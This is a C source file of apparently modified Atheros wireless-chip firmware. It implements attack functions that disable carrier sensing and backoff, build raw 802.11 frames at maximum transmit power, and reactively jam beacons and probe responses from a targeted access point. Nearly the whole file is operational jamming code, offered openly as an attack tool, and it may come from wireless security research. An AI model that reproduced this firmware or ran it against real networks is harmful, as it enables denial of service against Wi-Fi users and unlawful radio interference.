#include <adf_os_types.h>
#include <adf_os_pci.h>
#include <adf_os_dma.h>
#include <adf_os_timer.h>
#include <adf_os_lock.h>
#include <adf_os_io.h>
#include <adf_os_mem.h>
#include <adf_os_util.h>
#include <adf_os_stdtypes.h>
#include <adf_os_defer.h>
#include <adf_os_atomic.h>
#include <adf_nbuf.h>
#include <adf_net.h>
#include <adf_net_wcmd.h>
#include <adf_os_irq.h>
#include <ah.h>
#include <if_ath_pci.h>

#include "if_llc.h"
#include "ieee80211_var.h"
#include "ieee80211_proto.h"
#include "if_athrate.h"
#include "if_athvar.h"
#include "ah_desc.h"
#include "ar5416reg.h"
#include "debug.h"
#include "ar5416desc.h"

#include "attacks.h"

/** CPU PLL register for Magpie - taken from ./magpie_fw_dev/build/magpie_1_1/inc/magpie/reg_defs.h */
#define CPU_PLL_BASE_ADDRESS        0x00056000

/** Calculate difference between two timestamps */
static inline unsigned int tickdiff(unsigned int curr, unsigned int prev)
{
	if (curr >= prev)
		return curr - prev;
	else
		return (~prev) + 1 + curr;
}

/** Update elapsed time in miliseconds, and return the time at which this update took place */
static inline unsigned int update_elapsed(unsigned int prev, unsigned int freq, unsigned int *elapsed)
{
	unsigned int curr = NOW();
	unsigned int diff = tickdiff(curr, prev);

	// convert diff to miliseconds
	diff = diff / (freq * 1000);
	*elapsed += diff;

	// don't return curr, but compensate for rounding errors in division above
	return prev + diff * freq * 1000;
}


/** 
 * Configure the radio for jammin purposes. Recommended to disable interrupts
 * before calling this function.
 */
int attack_confradio(struct ath_softc_tgt *sc)
{
	int q;

	/* Ignore physical and virtual carrier sensing */
	iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW)
		| AR_DIAG_FORCE_RX_CLEAR | AR_DIAG_IGNORE_VIRT_CS);

	/*  Set SIFS to small value - ath9k_hw_set_sifs_time */
	iowrite32_mac(AR_D_GBL_IFS_SIFS, 1);

	/*  Set slot time to value - ath9k_hw_setslottime */
	iowrite32_mac(AR_D_GBL_IFS_SLOT, 1);

	/*  Set EIFS to small value - ath9k_hw_set_eifs_timeout */
	iowrite32_mac(AR_D_GBL_IFS_EIFS, 1);

	/* Disable backoff behaviour by setting parameters to zero */
	for (q = 0; q < 4; q++) {
		/* Reset CW_MIN, CW_MAX, and AIFSN for every Access Class */
		iowrite32_mac(AR_DLCL_IFS(q), 0);
	}

	// Alternative / additional interesting registers:
	// - AR_D_GBL_IFS_MISC to disable backoff (and other optimizations)
	// - AR_DMISC to disable backoff for each queue
	// - AR_DCHNTIME to set unlimited channel time for each queue
	// - AR_Q_TXD to disable Tx on other queues (see datasheet for usage)
	// - AR_DMISC to disable post backoff and virtual collision handling

	return 0;
}


/**
 * Allocate and construct a buffer ready for transmission.
 *
 * @data and @len: content of the packet to construct. The pointer is allowed to
             be zero. In this case a buffer of length `len` is filled with 0x88.
 * @waitack: set to 1 to retransmit the packet. If enabled, the sender MAC address
 *           is overwritten with that of the wireless chip (so we can detect ACKs).
 * @destmac: destination MAC address to use. Can be set to NULL to ignore. Usefull
 *           if you give a NULL data buffer.
 */
struct ath_tx_buf * attack_build_packet(
	struct ath_softc_tgt *sc, uint8_t *data,
	a_int32_t len, char waitack, unsigned char destmac[6])
{
	struct ath_tx_desc *ds0, *ds;
	struct ieee80211_node_target *ni;
	struct ath_hal *ah = sc->sc_ah;
	a_uint8_t txrate;
	a_int32_t i, hdrlen, pktlen;
	struct ath_tx_buf *bf;
	adf_nbuf_t skb;
	struct ath_rc_series rcs[4];
	HAL_11N_RATE_SERIES series[4];
	unsigned char *buff;
	const HAL_RATE_TABLE *rt;

	//
	// Step 1 - Initialize stuff
	//

	adf_os_mem_set(rcs, 0, sizeof(struct ath_rc_series)*4);
	adf_os_mem_set(series, 0, sizeof(HAL_11N_RATE_SERIES)*4);

	// second argument is of type struct ath_vap_target *
	rcs[0].rix = ath_get_minrateidx(sc, &sc->sc_vap[0]);
	rcs[0].tries = ATH_TXMAXTRY;
	rcs[0].flags = 0;

	// TODO !!!!
#if 0
	// Mathy: Force a specific rate if requested
	if (sc->sc_forcerate && sc->sc_forcedratetable) {
		printk("att_bld_rx_pkt: forcerate\n");
		rcs[0].rix = sc->sc_fixedrate;
		rt = sc->sc_forcedratetable;
	} else {
		rt = sc->sc_currates;
	}
#else
	rt = sc->sc_currates;
#endif

	adf_os_assert(sc->sc_currates != NULL);
	txrate = rt->info[rcs[0].rix].rateCode;

	for (i=0; i < 4; i++) {
		series[i].Tries = 2;
		series[i].Rate = txrate;
		series[i].ChSel = sc->sc_ic.ic_tx_chainmask;
		series[i].RateFlags = 0;
	}

	//
	// Step 2 - Build ath_tx_buff
	//

	// TODO: Improve function interface...
	skb = adf_nbuf_alloc(len, 0, 0);
	if (skb == NULL) {
		printk("adf_nbuf_alloc failed\n");
		return NULL;
	}
	buff = adf_nbuf_put_tail(skb, len);
	if (data)
		adf_os_mem_copy(buff, data, len);
	else
		adf_os_mem_set(buff, 0x88, len);

	// set destination mac if given
	if (destmac) {
		adf_os_mem_copy(buff + 4, destmac, 6);
	}

	// include sender MAC address if enough room AND ack retransmit is requesteds
	if (waitack && len >= 4 + 6 + 6)
	{
		unsigned int id0 = ioread32_mac(AR_STA_ID0);
		unsigned int id1 = ioread32_mac(AR_STA_ID1);

		buff[4 + 6 + 0] = (id0      ) & 0xFF;
		buff[4 + 6 + 1] = (id0 >> 8 ) & 0xFF;
		buff[4 + 6 + 2] = (id0 >> 16) & 0xFF;
		buff[4 + 6 + 3] = (id0 >> 24) & 0xFF;
		buff[4 + 6 + 4] = (id1      ) & 0xFF;
		buff[4 + 6 + 5] = (id1 >> 8 ) & 0xFF;
	}

	//dump_skb(skb);
	//dump_ath_data_hdr_t(mh);

	hdrlen = ieee80211_anyhdrsize(buff);
	pktlen = len;
	// XXX
	pktlen -= (hdrlen & 3);
	pktlen += IEEE80211_CRC_LEN;

	// sc->sc_sta[0] is of type struct ath_node_target *
	ni = &sc->sc_sta[0].ni;
	if (!sc->sc_sta[0].an_valid || ni->ni_vap == NULL) return 0;

	// Get first number in the queue and then remove it from the queue - see ath_tx_buf_alloc
	bf = asf_tailq_first(&sc->sc_txbuf);
	if (!bf) {
		//printk("asf_tailq_first failed\n");
		return 0;
	}
	asf_tailq_remove(&sc->sc_txbuf, bf, bf_list);

	bf->bf_cookie = 0;
	bf->bf_endpt = 5;
	bf->bf_protmode = 0;
	// Generate an interrupt when the frame has been transmitted and XXX
	bf->bf_flags = HAL_TXDESC_INTREQ | HAL_TXDESC_CLRDMASK;
	bf->bf_skb = skb;
	bf->bf_node = ni;
	adf_os_mem_copy(bf->bf_rcs, rcs, sizeof(rcs));
	// Data going from device to memory
	adf_nbuf_map(sc->sc_dev, bf->bf_dmamap, skb, ADF_OS_DMA_TO_DEVICE);
	adf_nbuf_queue_add(&bf->bf_skbhead, skb);

	//
	// Step 3 - Build descriptor buffer
	//	

	if (!waitack)
		bf->bf_flags |= HAL_TXDESC_NOACK;

	// Sets control/status flags in ath_tx_desc. See ar5416_hw.c:ar5416SetupTxDesc_20.
	ah->ah_setupTxDesc(bf->bf_desc
			    , pktlen			  /* packet length */
			    , hdrlen			  /* header length */
			    , HAL_PKT_TYPE_NORMAL	  /* Atheros packet type */
			    , 63			  /* txpower (63 is the maximum) */
			    , txrate			  /* XXX - series 0 rate/tries */
			    , 0				  /* number of retries (only applicable for Tx queue 0... though it appears to have no affect) */
			    , HAL_TXKEYIX_INVALID	  /* key cache index */
			    , bf->bf_flags		  /* can include HAL_TXDESC_NOACK */
			    , 0				  /* XXX - rts/cts rate */
			    , 0				  /* XXX - rts/cts duration */
			    );

	// TODO FIXME
	// ath_filltxdesc(sc, bf);
	{
		ds0 = ds = bf->bf_desc;
		adf_nbuf_dmamap_info(bf->bf_dmamap, &bf->bf_dmamap_info);

		for (i = 0; i < bf->bf_dmamap_info.nsegs; i++, ds++) {

			ds->ds_data = bf->bf_dmamap_info.dma_segs[i].paddr;

			// Link to the next, (i + 1)th, desc. if it exists.
			if (i == (bf->bf_dmamap_info.nsegs - 1)) {
				ds->ds_link = 0;
				bf->bf_lastds = ds;
			} else
				ds->ds_link = (adf_os_dma_addr_t)(&bf->bf_descarr[i+1]);

			// Fills in some control words in the ath_tx_desc struct
			ah->ah_fillTxDesc(ds
					   , bf->bf_dmamap_info.dma_segs[i].len		/* Segment length */
					   , i == 0					/* First segment? */
					   , i == (bf->bf_dmamap_info.nsegs - 1)	/* Last segment? */
					   , ds0);					/* First descriptor */
		}
	}

	// sets various control registers in ath_bf_desc
	ah->ah_set11nRateScenario(bf->bf_desc, 0 /* durUpdateEn */, 0 /* ctsrate */, series, 4, 0 /* flags */);

	return bf;
}




/**
 * Reactively jam beacons and probe responses from an AP having MAC address `source`.
 * The attack is executed for `msecs` milisconds.
 *
 * Possible improvements/changes:
 * - Send larger packets so there is more overlap.
 * - Properly free the memory. Now we construct a buffer lazily and don't free it.
 * - Call the "OS update tick" routine so we don't manually have to manage the clock.
 */
int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
		       unsigned int msecs)
{
	static const int TXQUEUE = 0;
	static struct ath_tx_buf *bf;
	static struct ieee80211_frame wh;
	struct ath_hal *ah = sc->sc_ah;
	struct ath_rx_desc *ds, *ds2, *ds3, *ds4;
	struct ath_txq *txq;
	volatile struct ar5416_desc_20 *txads, *rxads;
	volatile unsigned char *buff;
	unsigned int elapsed, freq, prev;

	printk(">reactjam\n");

	// disable (simulated) interrupts and configure radio
	ah->ah_setInterrupts(sc->sc_ah, 0);
	attack_confradio(sc);

	// Lazily allocated buffer -- TODO: how to properly free this memory?
	if (bf == NULL) {
		A_MEMSET(&wh, 2, sizeof(wh));
		// Do not retransmit dummy packet to jam. Change 3rd parameter
		// to 1 to retransmit the dummy packet.
		bf = attack_build_packet(sc, (uint8_t*)&wh, sizeof(wh), 0, NULL);
	}

	// add buffer to the Tx list, save ath_tx_desc of the buffer
	txq = &sc->sc_txq[TXQUEUE];
	ATH_TXQ_INSERT_TAIL(txq, bf, bf_list);
	txq->axq_link = &bf->bf_lastds->ds_link;
	txads = AR5416DESC_20(bf->bf_desc);

	//
	// Prepare circular Rx buffer list: ds -> ds2 -> ds3 -> ds -> ...
	//

	ds = asf_tailq_first(&sc->sc_rxdesc);
	ds2 = asf_tailq_next(ds, ds_list);
	ds3 = asf_tailq_next(ds2, ds_list);
	ds4 = asf_tailq_next(ds3, ds_list);

	ds3->ds_list.tqe_next = ds;
	ds3->ds_link = (unsigned int)ds;

	//
	// Initialize Timer
	//

	// frequency in MHz
#ifdef MAGPIE_MERLIN
	// Note: ioread32_mac uses WLAN_BASE_ADDRESS as base, hence we can't use it.
	freq = *(unsigned int *)CPU_PLL_BASE_ADDRESS;
	freq = (freq - 5) / 4;// XXX properly reverse register content
	if (freq == 0) return 1;
#else
	freq = 117;
#endif

	elapsed = 0;
	prev = NOW();

	//
	// MONITOR THE BUFFERS
	//

	rxads = AR5416DESC_20(ds);
	ah->ah_setRxDP(ah, (unsigned int)rxads);

	// Enable Rx
	iowrite32_mac(AR_CR, AR_CR_RXE);
	iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) & ~AR_DIAG_RX_DIS);
	iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) & ~AR_DIAG_RX_ABORT);

	while (elapsed < msecs)
	{
		// fill in data that shouldn't occur in valid 802.11 frames
		buff = (volatile unsigned char *)rxads->ds_data;
		buff[15] = 0xF1;

		// prepare to send jam packet
		txads->ds_txstatus9 &= ~AR_TxDone;

		// Wait until frame has been detected, exit if it takes too long
		while (elapsed < msecs && buff[15] == 0xF1) {
			prev = update_elapsed(prev, freq, &elapsed);
		}

		// Exit on timeout, otherwise we recieved something
		if (elapsed >= msecs) break;

		// Candidates for determining length of ongoing reception:
		//  - ds_rxstatus1 & AR_DataLen  : #bytes already written to RAM
		//  - ds_rxstatus1 & AR_NumDelim : always zero?

		// jam beacons and probe responses from the bssid
		if (A_MEMCMP(source, buff + 10, 6) == 0 && (buff[0] == 0x80 || buff[0] == 0x50) )
		{
			// Abort Rx
			*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_DIAG_SW)) |= AR_DIAG_RX_ABORT;

			// Jam the packet
			*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_QTXDP(txq->axq_qnum))) = (a_uint32_t)txads;
			*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_Q_TXE)) = 1 << txq->axq_qnum;

			// Re-enable Rx for once packet is transmitted
			iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) & ~AR_DIAG_RX_ABORT);

			// No need to wait until AR_TxDone is set in txads->ds_txstatus9, we simple wait
			// until we receive the next frame.
			printk("+");
		} else {
			printk("-");
		}

		// move to next buffer in the (circular) list
		rxads = AR5416DESC_20(rxads->ds_link);

		// update elapsed time
		prev = update_elapsed(prev, freq, &elapsed);
	}

	printk("\n");

	//
	// Cleanup
	//

	// fix the linked list
	ds3->ds_list.tqe_next = ds4;
	ds3->ds_link = (unsigned int)ds4;

	// Temporarily disable Rx
	iowrite32_mac(AR_CR, AR_CR_RXD);
	iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) | AR_DIAG_RX_DIS);

	// Clear "received flag" of all subsequent buffers
	rxads = (struct ar5416_desc_20 *)ar5416GetRxDP(ah);
	while (rxads != NULL) {
		rxads->ds_rxstatus8 &= ~AR_RxDone;
		rxads = (struct ar5416_desc_20 *)rxads->ds_link;
	}

	// Enable Rx again
	iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) & ~AR_DIAG_RX_DIS);
	iowrite32_mac(AR_CR, AR_CR_RXE);

	// re-enable interrupts
	ah->ah_setInterrupts(sc->sc_ah, sc->sc_imask);

	printk("<reactjam\n");

	return 0;
}



